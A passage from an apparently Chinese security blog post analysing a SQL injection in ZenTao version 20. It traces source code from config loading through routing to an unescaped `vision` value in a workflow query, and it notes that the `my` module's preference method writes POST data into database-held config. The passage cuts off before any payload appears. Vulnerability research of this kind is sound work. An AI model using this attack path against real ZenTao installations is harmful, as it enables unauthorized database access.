class="string">&#x27;ZT_DB_PORT&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;name      = getenv(<span class="string">&#x27;ZT_DB_NAME&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;user      = getenv(<span class="string">&#x27;ZT_DB_USER&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;encoding  = getenv(<span class="string">&#x27;ZT_DB_ENCODING&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;password  = getenv(<span class="string">&#x27;ZT_DB_PASSWORD&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;db-&gt;prefix    = getenv(<span class="string">&#x27;ZT_DB_PREFIX&#x27;</span>);</span><br><span class="line">    <span class="variable">$config</span>-&gt;webRoot       = <span class="variable">$webRoot</span> ? <span class="string">&quot;/<span class="subst">&#123;$webRoot&#125;</span>/&quot;</span> : <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>-&gt;default-&gt;lang = getenv(<span class="string">&#x27;ZT_DEFAULT_LANG&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引用自定义的配置。 Include the custom config file. */</span></span><br><span class="line"><span class="variable">$myConfigRoot</span> = (defined(<span class="string">&#x27;RUN_MODE&#x27;</span>) <span class="keyword">and</span> in_array(RUN_MODE, <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;uitest&#x27;</span>))) ? dirname(dirname(<span class="keyword">__FILE__</span>)) . DIRECTORY_SEPARATOR . <span class="string">&#x27;test&#x27;</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;config&#x27;</span> : dirname(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$myConfig</span> = <span class="variable">$myConfigRoot</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;my.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$myConfig</span>)) <span class="keyword">include</span> <span class="variable">$myConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 禅道配置文件。zentaopms settings. */</span></span><br><span class="line"><span class="variable">$zentaopmsConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;zentaopms.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$zentaopmsConfig</span>)) <span class="keyword">include</span> <span class="variable">$zentaopmsConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 数据表格操作配置文件。dtable actions settings. */</span></span><br><span class="line"><span class="variable">$actionsMapConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;actionsmap.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$actionsMapConfig</span>)) <span class="keyword">include</span> <span class="variable">$actionsMapConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* API路由配置。API route settings. */</span></span><br><span class="line"><span class="variable">$routesConfig</span> = dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;routes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$routesConfig</span>)) <span class="keyword">include</span> <span class="variable">$routesConfig</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Include extension config files. */</span></span><br><span class="line"><span class="variable">$extConfigFiles</span> = glob(dirname(<span class="keyword">__FILE__</span>) . DIRECTORY_SEPARATOR . <span class="string">&#x27;ext/*.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$extConfigFiles</span>) <span class="keyword">foreach</span>(<span class="variable">$extConfigFiles</span> <span class="keyword">as</span> <span class="variable">$extConfigFile</span>) <span class="keyword">include</span> <span class="variable">$extConfigFile</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set version. */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$config</span>-&gt;edition != <span class="string">&#x27;open&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$config</span>-&gt;version = <span class="variable">$config</span>-&gt;edition . <span class="variable">$config</span>-&gt;&#123;<span class="variable">$config</span>-&gt;edition . <span class="string">&#x27;Version&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$config</span>-&gt;edition != <span class="string">&#x27;max&#x27;</span>) <span class="keyword">unset</span>(<span class="variable">$config</span>-&gt;maxVersion);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$config</span>-&gt;edition != <span class="string">&#x27;ipd&#x27;</span>) <span class="keyword">unset</span>(<span class="variable">$config</span>-&gt;ipdVersion);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$config</span>-&gt;bizVersion);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$config</span>-&gt;maxVersion);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$config</span>-&gt;ipdVersion);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化应用之后，我们主要关注下<code>parseRequest</code>的解析过程，这里默认配置下<code>requestType</code>为<code>PATH_INFO</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseRequest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str_starts_with(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;/data/upload&#x27;</span>) &amp;&amp; !is_file(<span class="keyword">$this</span>-&gt;wwwRoot . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        helper::setStatus(<span class="number">404</span>);</span><br><span class="line">        helper::end();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;requestType == <span class="string">&#x27;PATH_INFO&#x27;</span> <span class="keyword">or</span> <span class="keyword">$this</span>-&gt;config-&gt;requestType == <span class="string">&#x27;PATH_INFO2&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parsePathInfo();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setRouteByPathInfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="keyword">$this</span>-&gt;config-&gt;requestType == <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseGET();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setRouteByGET();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerError(<span class="string">&quot;The request type <span class="subst">&#123;$this-&gt;config-&gt;requestType&#125;</span> not supported&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取完url后，根据-分割url获取module、method名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRouteByPathInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;uri))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 根据$requestFix分割符，分割网址。</span></span><br><span class="line"><span class="comment">         * There&#x27;s the request separator, split the URI by it.</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="keyword">if</span>(str_contains(<span class="keyword">$this</span>-&gt;uri, (<span class="keyword">string</span>) <span class="keyword">$this</span>-&gt;config-&gt;requestFix))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$items</span> = explode(<span class="keyword">$this</span>-&gt;config-&gt;requestFix, <span class="keyword">$this</span>-&gt;uri);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setModuleName(<span class="variable">$items</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setMethodName(<span class="variable">$items</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果网址中没有分隔符，使用默认的方法。</span></span><br><span class="line"><span class="comment">         * No request separator, use the default method name.</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setModuleName(<span class="keyword">$this</span>-&gt;uri);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setMethodName(<span class="keyword">$this</span>-&gt;config-&gt;default-&gt;method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setModuleName(<span class="keyword">$this</span>-&gt;config-&gt;default-&gt;module);   <span class="comment">// 使用默认模块 use the default module.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setMethodName(<span class="keyword">$this</span>-&gt;config-&gt;default-&gt;method);   <span class="comment">// 使用默认方法 use the default method.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setControlFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看其实现类setControlFile,如果<code>this-&gt;config-&gt;edition</code>不为open且不在安装或升级模式下,可以得到注入点为<code>$this-&gt;config-&gt;vision</code>，但是在之前根据<code>loadMainConfig</code>加载config.php时已经成为固定了，表面上来说是不可控的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setControlFile</span>(<span class="params"><span class="variable">$exitIfNone</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Set raw module and method name for fetch control. */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;rawModule)) <span class="keyword">$this</span>-&gt;rawModule = <span class="keyword">$this</span>-&gt;moduleName;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;rawMethod)) <span class="keyword">$this</span>-&gt;rawMethod = <span class="keyword">$this</span>-&gt;methodName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If is not a biz version or is in install mode or in in upgrade mode, call parent method. */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;edition == <span class="string">&#x27;open&#x27;</span> <span class="keyword">or</span> <span class="keyword">$this</span>-&gt;installing <span class="keyword">or</span> <span class="keyword">$this</span>-&gt;upgrading) <span class="keyword">return</span> <span class="built_in">parent</span>::setControlFile(<span class="variable">$exitIfNone</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the requested module is defined in workflow. */</span></span><br><span class="line">    <span class="variable">$flow</span> = <span class="keyword">$this</span>-&gt;dbQuery(<span class="string">&quot;SELECT * FROM &quot;</span> . TABLE_WORKFLOW . <span class="string">&quot; WHERE `module` = &#x27;<span class="subst">$this</span>-&gt;moduleName&#x27;&quot;</span>)-&gt;fetch();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$flow</span>) <span class="keyword">return</span> <span class="built_in">parent</span>::setControlFile(<span class="variable">$exitIfNone</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flow</span>-&gt;status != <span class="string">&#x27;normal&#x27;</span>) helper::end(<span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;meta charset=&#x27;utf-8&#x27;&gt;&lt;/head&gt;&lt;body&gt;<span class="subst">&#123;$this-&gt;lang-&gt;flowNotRelease&#125;</span>&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 工作流中配置的标签应该请求browse方法，而某些内置流程本身包含browse方法。在这里处理请求的时候会无法区分是内置的browse方法还是工作</span></span><br><span class="line"><span class="comment">     * 流标签的browse方法，为了避免此类冲突，在工作流中配置出的标签请求的方法改为browseLabel，在设置控制器文件时需要将其重设为browse。</span></span><br><span class="line"><span class="comment">     * Tags configured in the workflow should request the browse method, and some built-in processes themselves contain the browse</span></span><br><span class="line"><span class="comment">     * method. When processing a request here, it is impossible to distinguish between the built-in browse method and the browse</span></span><br><span class="line"><span class="comment">     * method of the workflow tag. In order to avoid such conflicts, the method of configuring the label request in the workflow</span></span><br><span class="line"><span class="comment">     * is changed to browseLabel, which needs to be reset to browse when setting the controller file.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flow</span>-&gt;buildin &amp;&amp; <span class="keyword">$this</span>-&gt;methodName == <span class="string">&#x27;browselabel&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rawModule = <span class="keyword">$this</span>-&gt;moduleName;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rawMethod = <span class="string">&#x27;browse&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;isFlow    = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$moduleName</span> = <span class="string">&#x27;flow&#x27;</span>;</span><br><span class="line">        <span class="variable">$methodName</span> = <span class="string">&#x27;browse&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;setFlowURI(<span class="variable">$moduleName</span>, <span class="variable">$methodName</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="keyword">$this</span>-&gt;dbQuery(<span class="string">&quot;SELECT * FROM &quot;</span> . TABLE_WORKFLOWACTION . <span class="string">&quot; WHERE `module` = &#x27;<span class="subst">$this</span>-&gt;moduleName&#x27; AND `action` = &#x27;<span class="subst">$this</span>-&gt;methodName&#x27; AND `vision` = &#x27;<span class="subst">&#123;$this-&gt;config-&gt;vision&#125;</span>&#x27;&quot;</span>)-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span>(zget(<span class="variable">$action</span>, <span class="string">&#x27;extensionType&#x27;</span>) == <span class="string">&#x27;override&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rawModule = <span class="keyword">$this</span>-&gt;moduleName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rawMethod = <span class="keyword">$this</span>-&gt;methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isFlow    = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadModuleConfig(<span class="string">&#x27;workflowaction&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$moduleName</span> = <span class="string">&#x27;flow&#x27;</span>;</span><br><span class="line">            <span class="variable">$methodName</span> = <span class="keyword">$this</span>-&gt;methodName;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 工作流中除了内置方法外的方法，如果是批量操作调用batchOperate方法，其它操作调用operate方法来执行。</span></span><br><span class="line"><span class="comment">             * In addition to the built-in methods in the workflow, if the batch operation calls the batchOperate method, other operations call the operate method to execute.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span>(!in_array(<span class="keyword">$this</span>-&gt;methodName, <span class="keyword">$this</span>-&gt;config-&gt;workflowaction-&gt;default-&gt;actions))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$action</span>-&gt;type == <span class="string">&#x27;single&#x27;</span>) <span class="variable">$methodName</span> = <span class="string">&#x27;operate&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$action</span>-&gt;type == <span class="string">&#x27;batch&#x27;</span>)  <span class="variable">$methodName</span> = <span class="string">&#x27;batchOperate&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;setFlowURI(<span class="variable">$moduleName</span>, <span class="variable">$methodName</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Call method of parent. */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::setControlFile(<span class="variable">$exitIfNone</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但其实禅道这个系统的配置不仅受本地文件控制，实际上还受数据库中的zt_config库控制</p><p><img src="/2024/08/26/year/2024/8/%E6%B5%85%E6%9E%90%E7%A6%85%E9%81%93%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-Version-20-2/image-20240826221407774.png" alt="image-20240826221407774"></p><p>对于以上部分的系统配置覆盖，受index.php中的<code>loadCommon</code>控制，通过<code>$common-&gt;setUserConfig();</code>加载远程配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Run the app. */</span></span><br><span class="line"><span class="variable">$app</span>-&gt;setStartTime(<span class="variable">$startTime</span>);</span><br><span class="line"><span class="variable">$common</span> = <span class="variable">$app</span>-&gt;loadCommon();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadCommon</span>(<span class="params"></span>): <span class="title">object</span>|<span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setModuleName(<span class="string">&#x27;common&#x27;</span>);</span><br><span class="line">    <span class="variable">$commonModelFile</span> = <span class="keyword">$this</span>-&gt;setModelFile(<span class="string">&#x27;common&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$commonModelFile</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    helper::import(<span class="variable">$commonModelFile</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;framework-&gt;extensionLevel == <span class="number">0</span> <span class="keyword">and</span> class_exists(<span class="string">&#x27;commonModel&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$common</span> = <span class="keyword">new</span> commonModel();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="keyword">$this</span>-&gt;config-&gt;framework-&gt;extensionLevel &gt; <span class="number">0</span>  <span class="keyword">and</span> class_exists(<span class="string">&#x27;extCommonModel&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$common</span> = <span class="keyword">new</span> extCommonModel();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(class_exists(<span class="string">&#x27;commonModel&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$common</span> = <span class="keyword">new</span> commonModel();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadLang(<span class="string">&#x27;company&#x27;</span>);</span><br><span class="line">    <span class="variable">$common</span>-&gt;setUserConfig();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;setDebug();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$common</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们简单看看<code>module/common/model.php</code>做了什么，因此可以看到确实从数据库中加载了配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setUserConfig</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;sendHeader();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;setCompany();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;setUser();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;setApproval();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;loadConfigFromDB();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;loadCustomFromDB();</span><br><span class="line">  <span class="keyword">$this</span>-&gt;initAuthorize();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checkIP()) <span class="keyword">return</span> <span class="keyword">print</span>(<span class="keyword">$this</span>-&gt;lang-&gt;ipLimited);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从数据库加载配置信息。</span></span><br><span class="line"><span class="comment"> * Load configs from database and save it to config-&gt;system and config-&gt;personal.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadConfigFromDB</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Get configs of system and current user. */</span></span><br><span class="line">    <span class="variable">$account</span> = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;app-&gt;user-&gt;account) ? <span class="keyword">$this</span>-&gt;app-&gt;user-&gt;account : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config-&gt;db-&gt;name) <span class="variable">$config</span> = <span class="keyword">$this</span>-&gt;loadModel(<span class="string">&#x27;setting&#x27;</span>)-&gt;getSysAndPersonalConfig(<span class="variable">$account</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config-&gt;system   = <span class="keyword">isset</span>(<span class="variable">$config</span>[<span class="string">&#x27;system&#x27;</span>]) ? <span class="variable">$config</span>[<span class="string">&#x27;system&#x27;</span>] : <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;config-&gt;personal = <span class="keyword">isset</span>(<span class="variable">$config</span>[<span class="variable">$account</span>]) ? <span class="variable">$config</span>[<span class="variable">$account</span>] : <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;commonTao-&gt;updateDBWebRoot(<span class="keyword">$this</span>-&gt;config-&gt;system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Override the items defined in config/config.php and config/my.php. */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;system-&gt;common))   <span class="keyword">$this</span>-&gt;app-&gt;mergeConfig(<span class="keyword">$this</span>-&gt;config-&gt;system-&gt;common, <span class="string">&#x27;common&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;config-&gt;personal-&gt;common)) <span class="keyword">$this</span>-&gt;app-&gt;mergeConfig(<span class="keyword">$this</span>-&gt;config-&gt;personal-&gt;common, <span class="string">&#x27;common&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;config-&gt;disabledFeatures = <span class="keyword">$this</span>-&gt;config-&gt;disabledFeatures . <span class="string">&#x27;,&#x27;</span> . <span class="keyword">$this</span>-&gt;config-&gt;closedFeatures;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此如果我们能控制数据库配置信息那么很显然我们便能完成一次SQL注入</p><p>恰好在<code>module/my/control.php</code>，可以看到遍历了POST的key/value对数据库config配置做了更改，因此利用不言而喻</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preference</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$showTip</span> = <span class="string">&#x27;true&#x27;</span></span>)</span></span><br><span class="line"><span 